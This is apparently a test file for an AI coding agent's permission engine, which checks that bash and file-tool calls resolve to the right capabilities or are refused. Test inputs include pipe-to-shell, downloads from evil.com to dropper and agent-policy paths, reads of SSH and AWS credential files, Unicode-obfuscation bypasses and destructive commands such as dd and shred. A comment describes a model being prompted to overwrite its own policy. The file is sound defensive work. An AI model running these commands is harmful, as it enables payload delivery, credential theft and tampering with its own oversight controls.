import { beforeAll, describe, expect, test } from 'bun:test';
import { initBashParser } from '../../src/permissions/bash-parser.ts';
import { type Capability, formatCapability } from '../../src/permissions/capabilities.ts';
// Importing the index file loads every builtin resolver via its
// side-effecting register calls.
import {
  type ResolverContext,
  getResolver,
  resolveCapabilities,
} from '../../src/permissions/resolvers/index.ts';

// Bash resolver needs the tree-sitter-bash grammar loaded. Init is
// async + idempotent; calling once before any bash test runs is
// enough. The other resolvers don't need it but pay zero cost
// either way.
beforeAll(async () => {
  await initBashParser();
});

const CTX: ResolverContext = { cwd: '/work/proj', home: '/home/op' };

const capStrings = (caps: readonly Capability[]): string[] => caps.map(formatCapability);

describe('registry', () => {
  test('builtins are registered on import', () => {
    for (const name of [
      'read_file',
      'write_file',
      'edit_file',
      'grep',
      'glob',
      'fetch_url',
      'bash',
    ]) {
      expect(getResolver(name)).toBeDefined();
    }
  });

  test('unknown tool falls back to Conservative with empty capabilities', () => {
    const r = resolveCapabilities('mystery_tool', {}, CTX);
    expect(r.kind).toBe('conservative');
    if (r.kind === 'conservative') {
      expect(r.capabilities).toEqual([]);
      expect(r.reason).toContain('no resolver registered');
    }
  });
});

describe('read_file resolver', () => {
  test('resolves relative path against cwd', () => {
    const r = resolveCapabilities('read_file', { file_path: 'src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/src/index.ts']);
      expect(r.confidence).toBe('high');
    }
  });

  test('absolute path preserved', () => {
    const r = resolveCapabilities('read_file', { file_path: '/etc/hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/etc/hosts']);
    }
  });

  test('missing arg refuses', () => {
    const r = resolveCapabilities('read_file', {}, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('wrong type refuses', () => {
    const r = resolveCapabilities('read_file', { file_path: 123 }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

describe('write_file / edit_file resolvers', () => {
  test('write_file produces write-fs AND read-fs', () => {
    const r = resolveCapabilities('write_file', { file_path: './out.txt' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const strings = capStrings(r.capabilities).sort();
      expect(strings).toEqual(['read-fs:/work/proj/out.txt', 'write-fs:/work/proj/out.txt']);
    }
  });

  test('edit_file shape matches write_file', () => {
    const w = resolveCapabilities('write_file', { file_path: 'x' }, CTX);
    const e = resolveCapabilities('edit_file', { file_path: 'x' }, CTX);
    if (w.kind === 'ok' && e.kind === 'ok') {
      expect(capStrings(w.capabilities).sort()).toEqual(capStrings(e.capabilities).sort());
    }
  });
});

describe('grep + glob resolvers', () => {
  test('grep without path falls back to cwd', () => {
    const r = resolveCapabilities('grep', { pattern: 'foo' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj']);
    }
  });
  test('grep with path produces read-fs for that path', () => {
    const r = resolveCapabilities('grep', { pattern: 'x', path: 'src' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/src']);
    }
  });
  test('glob without cwd uses session cwd', () => {
    const r = resolveCapabilities('glob', { pattern: '**/*.ts' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj']);
    }
  });
  test('glob honors explicit cwd', () => {
    const r = resolveCapabilities('glob', { pattern: '**/*.ts', cwd: 'tests' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/tests']);
    }
  });
});

describe('fetch_url resolver', () => {
  test('http URL produces net-egress with host', () => {
    const r = resolveCapabilities('fetch_url', { url: 'https://api.example.com/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['net-egress:api.example.com']);
    }
  });
  test('host case is normalized', () => {
    const r = resolveCapabilities('fetch_url', { url: 'https://API.Github.COM' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['net-egress:api.github.com']);
    }
  });
  test('non-http(s) refuses', () => {
    expect(resolveCapabilities('fetch_url', { url: 'file:///etc/passwd' }, CTX).kind).toBe(
      'refuse',
    );
    expect(resolveCapabilities('fetch_url', { url: 'ftp://example.com' }, CTX).kind).toBe('refuse');
    expect(resolveCapabilities('fetch_url', { url: 'gopher://x' }, CTX).kind).toBe('refuse');
  });
  test('malformed URL refuses', () => {
    expect(resolveCapabilities('fetch_url', { url: 'not a url' }, CTX).kind).toBe('refuse');
  });
  test('missing arg refuses', () => {
    expect(resolveCapabilities('fetch_url', {}, CTX).kind).toBe('refuse');
  });
});

describe('bash resolver — simple commands', () => {
  test('ls produces exec:shell + read-fs', () => {
    const r = resolveCapabilities('bash', { command: 'ls -la' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:shell');
      expect(s).toContain('read-fs:/work/proj');
    }
  });

  test('ls with path target produces read-fs of that path', () => {
    const r = resolveCapabilities('bash', { command: 'ls /etc' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/etc');
    }
  });

  test('rm produces delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'rm -rf /tmp/x' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/tmp/x');
    }
  });

  test('mv produces read-fs + write-fs', () => {
    const r = resolveCapabilities('bash', { command: 'mv src/a.ts src/b.ts' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/a.ts');
      expect(s).toContain('write-fs:/work/proj/src/b.ts');
    }
  });

  test('curl produces net-egress with extracted host', () => {
    const r = resolveCapabilities('bash', { command: 'curl https://api.github.com/repos' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:api.github.com');
    }
  });

  test('git status produces git-write read-only', () => {
    const r = resolveCapabilities('bash', { command: 'git status' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj');
    }
  });

  test('git push produces git-write + net-egress', () => {
    const r = resolveCapabilities('bash', { command: 'git push origin main' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('git-write:/work/proj');
      expect(s).toContain('net-egress:*');
    }
  });

  test('git clean -fd produces delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'git clean -fd' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/work/proj');
    }
  });

  test('npm install produces exec:arbitrary + write-fs(node_modules) + net-egress(registry)', () => {
    const r = resolveCapabilities('bash', { command: 'npm install' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:arbitrary');
      expect(s).toContain('write-fs:/work/proj/node_modules');
      expect(s).toContain('net-egress:registry.npmjs.org');
    }
  });

  test('chmod produces write-fs of target', () => {
    const r = resolveCapabilities('bash', { command: 'chmod 755 ./script.sh' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/work/proj/script.sh');
    }
  });
});

describe('bash resolver — refusals', () => {
  test.each(['dd', 'mkfs.ext4', 'fdisk', 'parted', 'mkswap', 'shred', 'eval $X', 'source ./foo'])(
    'refuses %s',
    (cmd) => {
      const r = resolveCapabilities('bash', { command: cmd }, CTX);
      expect(r.kind === 'refuse' || r.kind === 'conservative').toBe(true);
    },
  );

  test('refuses bash -c (dynamic shell)', () => {
    const r = resolveCapabilities('bash', { command: 'bash -c "do something"' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses curl --proxy (evasion shape)', () => {
    const r = resolveCapabilities('bash', { command: 'curl --proxy x https://foo.com' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses rm without target', () => {
    const r = resolveCapabilities('bash', { command: 'rm' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses mv with single arg', () => {
    const r = resolveCapabilities('bash', { command: 'mv only-one' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('missing command yields empty Ok (engine-internal reject handled downstream)', () => {
    // Missing-arg cases are detected by `checkBash` in the engine,
    // which produces a deny with `source.layer='default'` and no
    // section. Returning `refuse` here would re-route attribution
    // to `resolver-refuse`, which is reserved for structural
    // dangers (dd, eval, bash -c with dynamic arg). Empty Ok
    // keeps the downstream deny clean.
    const r = resolveCapabilities('bash', {}, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(r.capabilities).toEqual([]);
    }
  });
});

describe('bash resolver — adversarial shapes are Refused (slice 6: whitelist + Refuse)', () => {
  test('pipe-to-shell pattern is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'curl URL | sh' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('pipe-to-shell');
    }
  });

  test('command substitution $() is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo $(cat /etc/passwd)' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('command_substitution');
    }
  });

  test('backtick command substitution is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo `whoami`' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('parameter expansion ${var/...} is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo ${HOME/op/root}' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('process substitution <(cmd) is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'cat <(ls)' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('process_substitution');
    }
  });

  test('unknown first-token is Refused (closed whitelist)', () => {
    const r = resolveCapabilities('bash', { command: 'mystery-cli --do-thing' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('mystery-cli');
    }
  });

  test('cmd1; cmd2 with one unknown is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'cmd1; cmd2' }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

describe('bash resolver — well-known compound shapes resolve to Ok', () => {
  test('logical chain (&&) of known commands aggregates capabilities', () => {
    const r = resolveCapabilities('bash', { command: 'ls && rm /tmp/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:shell');
      expect(s).toContain('delete-fs:/tmp/x');
    }
  });

  test('single command with literal redirect emits write-fs', () => {
    const r = resolveCapabilities('bash', { command: 'echo hi > /tmp/out' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/tmp/out');
    }
  });

  test('find with literal redirect is Ok (single command, AST recognized)', () => {
    const r = resolveCapabilities('bash', { command: 'find . -name "*.ts" > /tmp/list' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — per-command argument semantics', () => {
  // Fix #1: echo / printf are pure-output. Their args are literal
  // strings emitted to stdout, NOT filesystem paths. The resolver
  // must not attribute read-fs for path-shaped args, nor must the
  // protected-path check fire (`echo /etc/passwd` does not read
  // /etc/passwd, it just prints the string).
  test('echo with path-shaped arg does NOT emit read-fs', () => {
    const r = resolveCapabilities('bash', { command: 'echo /work/proj/src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toEqual(['exec:shell']);
      expect(s).not.toContain('read-fs:/work/proj/src/index.ts');
    }
  });

  test('echo /etc/passwd does NOT fire protected-path (no fs read)', () => {
    // Without fix #1, this would either deny (protected /etc) or
    // escalate confidence to low. With pure-output semantics the
    // string is just bytes on stdout.
    const r = resolveCapabilities('bash', { command: 'echo /etc/passwd' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(r.confidence).toBe('high');
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  test('echo with quoted string does NOT split into multiple read-fs', () => {
    // The old `cmdRead` mapping would have turned "hello world" into
    // a single read-fs:`hello world` path. cmdEcho returns nothing.
    const r = resolveCapabilities('bash', { command: 'echo "hello world"' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  test('echo redirect target IS protected-path checked (defense in depth)', () => {
    // The redirect loop in analyzeCommand runs for every command
    // regardless of pure-output status — writing bytes to /etc/foo
    // is dangerous whoever produced them. Should escalate.
    const r = resolveCapabilities('bash', { command: 'echo hi > /etc/hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/etc/hosts');
      expect(r.confidence).toBe('low');
    }
  });

  test('printf is also treated as pure-output', () => {
    const r = resolveCapabilities('bash', { command: 'printf "%s\\n" /work/proj/file' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  // Fix #2: grep / rg first positional is the regex pattern, not a
  // file path. The resolver must skip it. find, in contrast, takes
  // all positionals as paths.
  test('grep pattern file → read-fs of file only (pattern NOT a path)', () => {
    const r = resolveCapabilities('bash', { command: 'grep token src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/index.ts');
      expect(s).not.toContain('read-fs:/work/proj/token');
    }
  });

  test('grep with only pattern (stdin mode) falls back to read-fs of cwd', () => {
    const r = resolveCapabilities('bash', { command: 'grep TODO' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj');
      expect(s).not.toContain('read-fs:/work/proj/TODO');
    }
  });

  test('grep pattern f1 f2 f3 → read-fs of f1, f2, f3 only', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'grep needle src/a.ts src/b.ts src/c.ts' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/a.ts');
      expect(s).toContain('read-fs:/work/proj/src/b.ts');
      expect(s).toContain('read-fs:/work/proj/src/c.ts');
      expect(s).not.toContain('read-fs:/work/proj/needle');
    }
  });

  test('rg also skips first positional (same pattern-first semantics)', () => {
    const r = resolveCapabilities('bash', { command: 'rg foo src' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).not.toContain('read-fs:/work/proj/foo');
    }
  });

  test('find positionals ARE paths (not pattern-first)', () => {
    const r = resolveCapabilities('bash', { command: 'find src tests -name "*.ts"' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).toContain('read-fs:/work/proj/tests');
    }
  });

  // Fix #3: `--` separates flags from positionals. Tokens after
  // `--` are positional regardless of leading dash; `--` itself
  // is consumed (never a positional path).
  test('rm -- pos: `--` is consumed, positional path follows', () => {
    const r = resolveCapabilities('bash', { command: 'rm -- /tmp/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/tmp/x');
      // `--` must not show up as a phantom delete target
      expect(s).not.toContain('delete-fs:/work/proj/--');
    }
  });

  test('rm -- -dashed-file: leading-dash filename is positional after `--`', () => {
    // POSIX convention: `rm -- -rf` deletes a file literally named
    // "-rf". stripFlags after `--` must keep it.
    const r = resolveCapabilities('bash', { command: 'rm -- -dashfile' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/work/proj/-dashfile');
    }
  });

  test('grep -- pattern file: `--` is consumed, then pattern-skip applies', () => {
    const r = resolveCapabilities('bash', { command: 'grep -- pattern src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/index.ts');
      expect(s).not.toContain('read-fs:/work/proj/pattern');
      expect(s).not.toContain('read-fs:/work/proj/--');
    }
  });
});

// Slice 97 — R2 P0 finding: tilde was previously left literal by
// both `fs.resolveAbs` and `bash.resolveArg`, so model-emitted
// `~/.ssh/id_rsa` resolved to a literal `~` directory under cwd
// (`/work/proj/~/.ssh/id_rsa`). Shells expand `~` on execution, so
// the resolver view diverged from the runtime view — a `~`-rooted
// protected_paths rule could never match because the lexical scope
// no longer mentioned HOME. Slice 97 expands `~` and `~/<rest>`
// before `path.resolve` in BOTH resolvers, closing the gap.
describe('tilde expansion (slice 97, R2 P0)', () => {
  test('read_file file_path="~/.ssh/id_rsa" resolves under HOME, not under cwd', () => {
    const r = resolveCapabilities('read_file', { file_path: '~/.ssh/id_rsa' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/home/op/.ssh/id_rsa');
      // Negative — pre-slice this was the bug shape.
      expect(capStrings(r.capabilities)).not.toContain('read-fs:/work/proj/~/.ssh/id_rsa');
    }
  });

  test('bare "~" expands to HOME', () => {
    const r = resolveCapabilities('read_file', { file_path: '~' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/home/op');
    }
  });

  test('write_file path="~/.aws/credentials" lands under HOME', () => {
    const r = resolveCapabilities('write_file', { file_path: '~/.aws/credentials' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('write-fs:/home/op/.aws/credentials');
      expect(s).toContain('read-fs:/home/op/.aws/credentials');
    }
  });

  test('bash "cat ~/.ssh/known_hosts" resolves the arg under HOME', () => {
    const r = resolveCapabilities('bash', { command: 'cat ~/.ssh/known_hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/home/op/.ssh/known_hosts');
      expect(s).not.toContain('read-fs:/work/proj/~/.ssh/known_hosts');
    }
  });

  test('"~user/..." stays literal (other-user expansion is not safely resolvable)', () => {
    // Shell would expand `~root/...` against /etc/passwd; the engine
    // can't safely do that without an OS call and an LLM emitting
    // `~root/` is much more often an attack than legitimate. The
    // literal form will fail the policy in a downstream layer.
    const r = resolveCapabilities('read_file', { file_path: '~root/.ssh/id_rsa' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      // Literal `~root` under cwd — not HOME-expanded. The engine
      // is structurally unable to resolve it; the policy will
      // either deny or surface a confirm depending on configuration.
      expect(capStrings(r.capabilities)).toContain('read-fs:/work/proj/~root/.ssh/id_rsa');
    }
  });

  test('embedded "~" mid-path stays literal (not a shell-recognized form)', () => {
    // Shell only expands `~` at the start of a word; `src/~/foo`
    // is NOT a tilde reference. Resolver matches that contract —
    // expansion only when the input is `~` or starts with `~/`.
    const r = resolveCapabilities('read_file', { file_path: 'src/~/foo.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/work/proj/src/~/foo.ts');
    }
  });
});

// Slice 98 — R2 bash AST hardening. Three coordinated changes:
//   #196 literalText Unicode bypass (fullwidth / zero-width / RTL
//        / C1 control codepoints land as `Refuse` instead of
//        leaking through as the wrong byte sequence)
//   #198 walkAst recursion depth ceiling (pathological nested
//        input → structured refuse, not stack overflow)
//   #200 cmdCurlWget emits write-fs for `-o <path>` shapes (the
//        curl/wget download-to-file form was silently
//        net-egress-only; now write capabilities flow into
//        protected-path classification)
describe('bash resolver — Unicode bypass (slice 98, R2 #196)', () => {
  test('fullwidth semicolon in command name refuses', () => {
    // U+FF1B (fullwidth ；) renders as `;` to humans but is a
    // distinct codepoint. A deny rule against `;` would NOT
    // match `ls；rm` because tree-sitter tokenizes the fullwidth
    // form as part of the word, not as a punctuation `;`. Refuse
    // forces the operator's modal to see the literal.
    const r = resolveCapabilities('bash', { command: 'ls；rm' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('zero-width joiner inside command name refuses', () => {
    // `gi<ZWJ>t` renders as `git` but is a different byte sequence.
    // Without sanitization, an audit log would store `git` and the
    // operator would think a normal git invocation happened.
    const r = resolveCapabilities('bash', { command: 'gi‍t status' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('RTL override inside arg refuses', () => {
    // U+202E reverses display order. An adversarial source line
    // visible as `cat README` could execute `rm -rf /` if the
    // resolver trusted node.text.
    const r = resolveCapabilities('bash', { command: 'cat r‮README' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('byte-order mark inside arg refuses', () => {
    // U+FEFF is a zero-width-no-break-space that shells often
    // pass through verbatim. Hiding it inside `--config=...`
    // shifts the audited literal away from what got executed.
    const r = resolveCapabilities('bash', { command: 'echo ﻿foo' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('pure ASCII args still resolve cleanly (no false positives)', () => {
    // The defense MUST NOT regress the routine cases. `cat README`
    // emits a read-fs cap; `echo hello` no-ops the cap set.
    const r = resolveCapabilities('bash', { command: 'cat README' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — recursion depth ceiling (slice 98, R2 #198)', () => {
  test('pathologically nested input refuses without crashing (defense in depth)', () => {
    // The depth ceiling guards against adversarial input that would
    // otherwise blow the JS stack. Pre-slice, ~100k levels of
    // recursion could crash the engine before any refuse could
    // surface. The test PRIMARY assertion is "no crash": the
    // resolver MUST return a structured refuse, never throw.
    //
    // In practice, deep nesting hits an EARLIER defense first
    // (red-flag `compound_statement` for `(...)`, parse-error for
    // malformed shapes, etc.) — both outcomes count as defended.
    // The depth-exceeded reason is reserved for inputs that
    // legitimately parse + walk through that many levels but
    // exceed the ceiling.
    let cmd = 'ls';
    for (let i = 0; i < 100; i += 1) cmd = `(${cmd})`;
    const r = resolveCapabilities('bash', { command: cmd }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('depth ceiling does not throw — returns structured refuse on deep walk', () => {
    // 1000-level pipeline `cmd | cmd | cmd | ...`. Tree-sitter
    // parses these as left-folded pipeline nodes; each level
    // recurses through `visit`. Without MAX_AST_DEPTH the JS
    // stack would unwind via RangeError; with the ceiling, a
    // refuse envelope surfaces instead.
    const cmd = Array.from({ length: 1000 }, () => 'ls').join(' | ');
    const r = resolveCapabilities('bash', { command: cmd }, CTX);
    // Either refuses OR succeeds (tree-sitter may flatten the
    // pipeline so depth never crosses the ceiling). What we
    // explicitly test is the NO-THROW invariant — this expect
    // never runs if the call threw.
    expect(['ok', 'refuse']).toContain(r.kind);
  });
});

describe('bash resolver — curl/wget -o write target (slice 98, R2 #200)', () => {
  test('curl -o <path> emits write-fs alongside net-egress', () => {
    // Pre-slice the resolver emitted ONLY net-egress for this
    // shape, hiding the write side from §11 + audit. Slice 98
    // emits both; an attacker writing to a protected path via
    // curl is now subject to the same classifier as write_file.
    const r = resolveCapabilities(
      'bash',
      { command: 'curl https://evil.com/payload -o /tmp/dropper.sh' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:evil.com');
      expect(s).toContain('write-fs:/tmp/dropper.sh');
    }
  });

  test('curl --output=<path> long form with equals also emits write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'curl --output=/tmp/x https://example.com' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/x');
    }
  });

  test('wget -O <path> emits write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'wget https://example.com -O /tmp/y.tar.gz' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/y.tar.gz');
    }
  });

  test('curl -o- (write to stdout) does NOT emit a write target', () => {
    // The `-o -` and `-O -` forms write to stdout, not a file.
    // Emitting a write capability for `-` would be a false
    // positive that the protected-path classifier would have to
    // ignore.
    const r = resolveCapabilities('bash', { command: 'curl https://example.com -o -' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
    }
  });

  test('curl WITHOUT output flag still emits only net-egress (no regression)', () => {
    const r = resolveCapabilities('bash', { command: 'curl https://api.github.com/repos' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:api.github.com');
      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
    }
  });

  test('curl -o /etc/agent/policy.toml is now visible to §11', () => {
    // The motivating exploit: attacker prompts the model to
    // download a payload AND drop it where it overrides agent
    // policy. Without slice 98 the write-fs cap was missing, so
    // protected-path classification never fired. Now both caps
    // are emitted; the engine's §11 walk catches the /etc/*
    // escalate tier and forces confirm (or deny in bypass mode
    // per slice 97's bypass §11 hardening).
    const r = resolveCapabilities(
      'bash',
      { command: 'curl https://evil.com -o /etc/agent/policy.toml' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/agent/policy.toml');
    }
  });
});

// Slice 98 — defensive coverage for R2 #201. The redirect-shape
// extractor already returns null (→ refuse upstream) on any
// non-literal target, including `command_substitution`. These
// tests lock in that contract so a future refactor that loosens
// the literal check is loud rather than silent.
describe('bash resolver — redirect $() target stays refused (R2 #201)', () => {
  test('cmd > $(echo /etc/passwd) refuses', () => {
    // The `command_substitution` node sits where a literal target
    // would. `redirectShape` ignores non-word/string children, so
    // target stays null → null return → walker surfaces refuse.
    const r = resolveCapabilities('bash', { command: 'echo data > $(echo /etc/passwd)' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('cmd > `cmd` (backtick form) also refuses', () => {
    const r = resolveCapabilities('bash', { command: 'echo data > `echo /tmp/x`' }, CTX);
    expect(r.kind).toBe('refuse');
  });
});
